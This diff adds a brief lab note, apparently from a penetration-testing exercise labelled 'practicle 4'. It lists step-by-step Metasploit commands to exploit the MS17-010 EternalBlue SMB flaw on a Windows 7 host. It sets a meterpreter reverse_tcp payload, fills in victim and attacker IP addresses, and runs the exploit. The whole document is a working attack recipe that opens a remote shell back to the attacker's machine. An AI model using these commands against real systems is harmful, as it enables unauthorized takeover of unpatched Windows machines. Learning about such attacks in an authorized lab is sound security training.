@@ -1,0 +1,31 @@
+prracticle 4 :
+
+remote access - windows 7 ms17-010 eternalbule smb remote windows kernal pool
+
+
+
+
+
+msfconsole 
+
+search exploit/windows/smb
+
+use exploit/windows/smb/ms17_010_eternalblue
+
+show payloads 
+
+set payload payload/windows/x64/meterpreter/reverse_tcp
+
+show targets
+
+show options
+
+set RHOST 10.10.10.3  -windows ip
+
+set LHOST 10.10.10.2  -kali ip
+
+set LPORT 5555
+
+exploit
+
+run
